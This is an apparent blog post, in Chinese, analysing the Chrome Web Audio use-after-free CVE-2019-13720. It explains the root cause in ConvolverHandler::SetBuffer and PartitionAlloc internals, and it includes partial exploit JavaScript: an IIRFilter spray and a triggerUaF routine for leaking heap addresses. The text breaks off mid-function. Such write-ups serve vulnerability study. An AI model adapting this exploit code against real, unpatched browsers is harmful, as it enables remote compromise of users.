<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>分析 CVE-2019-13720 | My New Hugo Site</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="CVE-2019-13720
分析卡巴斯基 2019 年披露的在野利用 CVE-2019-13720。
漏洞分析
复现
分析报告 记录了受影响的 Chrome 版本号 76.0.3809.87，依照获取旧版本的 Chrome 中记录的方法，构建出 Chrome.exe。

ℹ️NOTE：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017

从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 getPartitionPageFreeListHeadEntryBySlotSize 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。
python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。
Web Audio API

ℹ️NOTE
POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：

MDN Using Web Audio API
MDN Web Audio API


Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。
用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。">
    <meta name="generator" content="Hugo 0.139.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >



    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/2022-05-26-cve-2019-13720/">
    

    <meta property="og:url" content="http://localhost:1313/posts/2022-05-26-cve-2019-13720/">
  <meta property="og:site_name" content="My New Hugo Site">
  <meta property="og:title" content="分析 CVE-2019-13720">
  <meta property="og:description" content="CVE-2019-13720 分析卡巴斯基 2019 年披露的在野利用 CVE-2019-13720。
漏洞分析 复现 分析报告 记录了受影响的 Chrome 版本号 76.0.3809.87，依照获取旧版本的 Chrome 中记录的方法，构建出 Chrome.exe。
ℹ️NOTE：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017
从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 getPartitionPageFreeListHeadEntryBySlotSize 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。
python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。
Web Audio API ℹ️NOTE
POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：
MDN Using Web Audio API MDN Web Audio API Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。
用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">

  <meta itemprop="name" content="分析 CVE-2019-13720">
  <meta itemprop="description" content="CVE-2019-13720 分析卡巴斯基 2019 年披露的在野利用 CVE-2019-13720。
漏洞分析 复现 分析报告 记录了受影响的 Chrome 版本号 76.0.3809.87，依照获取旧版本的 Chrome 中记录的方法，构建出 Chrome.exe。
ℹ️NOTE：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017
从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 getPartitionPageFreeListHeadEntryBySlotSize 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。
python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。
Web Audio API ℹ️NOTE
POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：
MDN Using Web Audio API MDN Web Audio API Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。
用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。">
  <meta itemprop="wordCount" content="2321">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="分析 CVE-2019-13720">
  <meta name="twitter:description" content="CVE-2019-13720 分析卡巴斯基 2019 年披露的在野利用 CVE-2019-13720。
漏洞分析 复现 分析报告 记录了受影响的 Chrome 版本号 76.0.3809.87，依照获取旧版本的 Chrome 中记录的方法，构建出 Chrome.exe。
ℹ️NOTE：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017
从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 getPartitionPageFreeListHeadEntryBySlotSize 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。
python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。
Web Audio API ℹ️NOTE
POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：
MDN Using Web Audio API MDN Web Audio API Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。
用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        My New Hugo Site
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">分析 CVE-2019-13720</h1>
      
      
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="cve-2019-13720">CVE-2019-13720</h1>
<p>分析<a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">卡巴斯基</a> 2019 年披露的在野利用 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html">CVE-2019-13720</a>。</p>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="复现">复现</h3>
<p><a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">分析报告</a> 记录了受影响的 Chrome 版本号 76.0.3809.87，依照<a href="2022-05-31-get-old-version-chrome-binary.md">获取旧版本的 Chrome</a> 中记录的方法，构建出 Chrome.exe。</p>
<hr>
<p><strong>ℹ️NOTE</strong>：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017</p>
<hr>
<p>从分析报告提取出 POC 代码片段，拼凑成一个完整的 POC 页面，代码中缺少 <code>getPartitionPageFreeListHeadEntryBySlotSize</code> 函数，先补充一个空函数，稍后理解了 POC 后再把它补上了。</p>
<p>python -m http.server 为 POC 页面搭建一个本地站点，Chrome.exe 访问 http://localhost:8000/ 确认可以触发漏洞。</p>
<h3 id="web-audio-api">Web Audio API</h3>
<hr>
<p><strong>ℹ️NOTE</strong></p>
<p>POC 用到了很多 Web Audio API 相关的对象，推荐先看下 MDN 相关页面：</p>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API/Using_Web_Audio_API">MDN Using Web Audio API</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API">MDN Web Audio API</a></li>
</ul>
<hr>
<p>Web Audio API 提供了流式处理音频数据的能力，支持音频解码，音效处理等常用操作。</p>
<p>用法：先创建 AudioContext 对象，再创建多个音频节点，将它们连到一起组成音频处理图。AudioContext 对象有一个特殊的 desination 节点，代表最终输出的音频。处理图从源节点开始，到目的节点结束，中间可以连接多个音效节点。启动处理任务，音频数据就沿着图到达各个中间节点，经过中间节点的处理，再继续流转到下个节点。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: 就类似于把电吉他、效果器、音箱等用线连好，之后在电吉他上进行操作，电吉他采集到的声音数据就顺着导线，经过效果器的处理，最终达到音箱播放出来。</p>
<hr>
<p>示例代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AudioContext</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// load some sound
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">audioElement</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;audio&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">track</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createMediaElementSource</span>(<span style="color:#a6e22e">audioElement</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// volume
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">gainNode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createGain</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// panning
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pannerOptions</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">pan</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">panner</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">StereoPannerNode</span>(<span style="color:#a6e22e">audioCtx</span>, <span style="color:#a6e22e">pannerOptions</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// connect our graph
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">track</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">gainNode</span>).<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">panner</span>).<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">destination</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// audioElement.play();
</span></span></span></code></pre></div><p>处理好的声音也可以不播放出来，而是缓存起来。<code>OfflineAudioContext</code> 就实现了这样的处理流程，它会启动一个后台处理任务，在后台工作线程中处理音频，处理结果保存到缓存中，待处理完成后供主线程使用。</p>
<h3 id="成因">成因</h3>
<p>漏洞是在 <a href="https://developer.mozilla.org/en-US/docs/Web/API/ConvolverNode">ConvolerNode</a> 节点的处理逻辑中，这个节点属于音效处理节点，用来对音频进行混响（Convolution Reverb），混响是音频信号处理中的一种算法，用来把声音进行叠加处理，模拟真实环境中的声音传播时的反射和叠加，漏洞和其算法细节关系不大，可以把它当做一种黑盒算法，输入就是原始的音频数据和 Impulse Response (IR）两个向量(多维数组)，输出就是混淆处理后的数据。IR 参数也是音频数据，JavaScript 中通过给 ConvolerNode.buffer 赋值来设置 IR 的值，对应的是 CPP 函数 <code>ConvolverHandler::SetBuffer</code>。漏洞就在这个函数里，给 <code>SetBuffer</code> 传一个空值时，它会释放 <code>revert_</code> 和 <code>shared_buffer_</code> 两个成员变量，但是这个操作没有加锁同步，如果其他线程正在使用这两个成员，就可能访问到释放后的内存。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: 音频数据大多是多声道的，所以一般是用一个向量来表示的，向量的维度和声道一致，例如：单声道用一维向量，立体声用二维向量。漏洞利用过程中用到的都是单声道的一维向量。</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> ConvolverHandler<span style="color:#f92672">::</span>SetBuffer(AudioBuffer<span style="color:#f92672">*</span> buffer,
</span></span><span style="display:flex;"><span>                                 ExceptionState<span style="color:#f92672">&amp;</span> exception_state) {
</span></span><span style="display:flex;"><span>  DCHECK(IsMainThread());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>buffer) {
</span></span><span style="display:flex;"><span>    reverb_.reset();
</span></span><span style="display:flex;"><span>    shared_buffer_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>用 <code>OfflineAudioContext</code> 就可以构造出符合条件的场景，<code>OfflineAudioContext</code> 启动的音频处理任务是在后台工作线程中进行的，如果工作线程正要进行混响处理时，主线程中把 <code>buffer</code> 设置为 <code>null</code>，那么工作线程后续处理就可能读/写到已经释放的内存。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: JavaScript 解释器是在 renderer 进程的主线程中运行的，执行音频处理这种耗时操作可能会阻塞其他代码的运行，影响用户界面响应。为了解决这个问题，耗时操作在 JavaScript 中一般都是在其他工作线程中异步处理的</p>
<hr>
<p>调试混响处理的流程，在下面这个函数中找到两个利用点：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> ReverbConvolver<span style="color:#f92672">::</span>Process(<span style="color:#66d9ef">const</span> AudioChannel<span style="color:#f92672">*</span> source_channel,
</span></span><span style="display:flex;"><span>                              AudioChannel<span style="color:#f92672">*</span> destination_channel,
</span></span><span style="display:flex;"><span>                              <span style="color:#66d9ef">uint32_t</span> frames_to_process) {
</span></span><span style="display:flex;"><span>  DCHECK(source_channel);
</span></span><span style="display:flex;"><span>  DCHECK(destination_channel);
</span></span><span style="display:flex;"><span>  DCHECK_GE(source_channel<span style="color:#f92672">-&gt;</span>length(), frames_to_process);
</span></span><span style="display:flex;"><span>  DCHECK_GE(destination_channel<span style="color:#f92672">-&gt;</span>length(), frames_to_process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">float</span><span style="color:#f92672">*</span> source <span style="color:#f92672">=</span> source_channel<span style="color:#f92672">-&gt;</span>Data();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">float</span><span style="color:#f92672">*</span> destination <span style="color:#f92672">=</span> destination_channel<span style="color:#f92672">-&gt;</span>MutableData();
</span></span><span style="display:flex;"><span>  DCHECK(source);
</span></span><span style="display:flex;"><span>  DCHECK(destination);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Feed input buffer (read by all threads)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  input_buffer_.Write(source, frames_to_process); <span style="color:#75715e">// &lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Accumulate contributions from each stage
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (wtf_size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> stages_.size(); <span style="color:#f92672">++</span>i)
</span></span><span style="display:flex;"><span>    stages_[i]<span style="color:#f92672">-&gt;</span>Process(source, frames_to_process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Finally read from accumulation buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  accumulation_buffer_.ReadAndClear(destination, frames_to_process); <span style="color:#75715e">// &lt;&lt;&lt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Now that we&#39;ve buffered more input, post another task to the background
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// thread.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (background_thread_) {
</span></span><span style="display:flex;"><span>    PostCrossThreadTask(
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>background_thread_<span style="color:#f92672">-&gt;</span>GetTaskRunner(), FROM_HERE,
</span></span><span style="display:flex;"><span>        CrossThreadBindOnce(<span style="color:#f92672">&amp;</span>ReverbConvolver<span style="color:#f92672">::</span>ProcessInBackground,
</span></span><span style="display:flex;"><span>                            CrossThreadUnretained(<span style="color:#66d9ef">this</span>)));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>ReverbConvolver</code> 是 <code>reverb_</code> 的成员，<code>input_buffer_</code> 和 <code>accumulation_buffer_</code>  这两个数组又是 ReverbConvolver 的成员，所以 reverb_ 析构时，<code>input_buffer_</code> 和 <code>accumulation_buffer_</code> 会被释放。如果释放后立刻执行到写入，<code>input_buffer_.Write</code> 就可以把数据写入释放后的内存。类似的 <code>accumulation_buffer_.ReadAndClear</code> 可以读到释放后的内存。</p>
<h3 id="利用">利用</h3>
<h4 id="partitionalloc">PartitionAlloc</h4>
<p>理解利用要先了解 PartitionAlloc 的元数据，下面的信息针对 76.0.3809.87 这个版本:</p>
<ul>
<li>PartitionAlloc 将堆分成多个 Partition，每种类型都固定从一个 Partition 申请内存，这样就可以把不同类型的对象在内存上隔离开，增加漏洞利用的难度。例如 <code>ArrayBuffer</code> 这种漏洞利用中常用的结构，被隔离到专用的 Partition 中，即使 <code>ArrayBuffer</code> 出现了越界读写问题，仅借助越界读写是不能跨越界限读到其他 Partition 的内容的。</li>
<li>PartitionAlloc 以 SuperPage (2 MiB) 为粒度从系统申请（预留）内存</li>
<li>每个 SuperPage 被分割成多个 PartitionPage (16 KiB)，首尾两个 PartitionPage 除第一个 PartitionPage 中第二个物理页面会被提交，其他部分都预留为不可访问的 guard page</li>
<li>第一个 PartitionPage 中的特殊页面，用来存放元数据，元数据可以先简单看成总计 4 KiB 的 <a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/partition_page.h;l=314;drc=e5b03e85ea180d1d1ab0dec471c7fd5d1706a9e4"><code>base::internal::PartitionPage</code></a> 数组，数组中每一项都对应着一个 PartitionPage，结构中存储了此 PartitionPage 的空闲块链表头，后继页地址，当前页状态等信息。
例如：元数据数组下标 1 处，存放的就是第二个 PartitionPage 的元数据
注意这里有两个 PartionPage，一个代表页面的单位，另一个是代表存储元数据的结构体。</li>
<li>PartitionPage 被分割成大小相同的内存块 (slot)，元数据中的空闲链表里存放着本页面内所有空闲内存块，此链表是一个单链表，采用的是头插法</li>
<li>每个 Partition 都有一组桶，每个桶都对应一个特定的大小，桶内存储一个 PartitionPage 元数据的地址，此页面的内存块大小和桶的大小匹配。这样在申请内存时，可以根据目的大小快速找到对应的桶，从桶指向的页面的空闲列表中分配一个满足条件的内存块。</li>
<li>内存块释放时，PartitionAlloc 用内存块地址计算出其所在页面的元数据的地址，将其插入空闲链表中。计算方法：通过与位运算算出 SuperPage 的地址，位运算算出内存块所在 PartitionPage 相对 SuperPage 的索引 i，最后通过 SuperPage + 4 KiB + i * sizeof(PartitionPage) 计算出元数据的地址。</li>
</ul>
<p>更多内容参考：</p>
<ul>
<li><a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md">官方文档</a></li>
<li><a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/partition_alloc_constants.h">代码注释</a></li>
</ul>
<h4 id="创建-iirfilters">创建 IIRFilters</h4>
<p>申请一组 <code>IIRFilter</code> 供后续利用使用，其他信息后面用到时再说明。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initialSetup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OfflineAudioContext</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">3000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">feedForward</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">feedback</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">feedback</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">feedForward</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">feedForward</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">512</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">iirFilters</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createIIRFilter</span>(<span style="color:#a6e22e">feedForward</span>, <span style="color:#a6e22e">feedback</span>));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="泄露地址">泄露地址</h4>
<p><code>accumulation_buffer_</code> 和 <code>input_buffer_</code> 内部都有一个名为 <code>buffer_</code> 的 <a href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/audio/audio_array.h"><code>AudioArray</code></a> 成员变量，负责管理内部缓冲区。<code>AudioArray</code> 直接从 PartitionAlloc 申请所需的内存。</p>
<p><code>AudioArray</code> 的析构函数会释放之前申请的内存块，由 PartitionAlloc 把它插入所属页面的空闲链表，把下一个空闲块指针写入内存块开头的 8 字节。因此，在 <code>ArrayBuffer</code> 把缓冲区释放后再读取其内容，就可以读到后继空闲块的地址。漏洞利用的第一部分就是利用 accumulation_buffer_ 读取到这个地址。</p>
<hr>
<p><strong>ℹ️NOTE</strong>: 从 ParitionAlloc 申请的内存地址，存放在 <code>AudioArray::allocation_</code></p>
<hr>
<p>代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">triggerUaF</span>(<span style="color:#a6e22e">doneCb</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OfflineAudioContext</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x400000</span>, <span style="color:#ae81ff">48000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">bufferSource</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBufferSource</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">convolver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createConvolver</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">scriptNode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createScriptProcessor</span>(<span style="color:#ae81ff">0x4000</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">channelBuffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">48000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">channelBuffer</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">channelBuffer</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loop</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loopStart</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">loopEnd</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">channelBuffer</span>.<span style="color:#a6e22e">getChannelData</span>(<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">fill</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">convolver</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">convolver</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">scriptNode</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scriptNode</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">destination</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bufferSource</span>.<span style="color:#a6e22e">start</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">finished</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scriptNode</span>.<span style="color:#a6e22e">onaudioprocess</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">evt</span>) {
</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">channelDataArray</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>	    		<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">evt</span>.<span style="color:#a6e22e">inputBuffer</span>.<span style="color:#a6e22e">getChannelData</span>(<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>
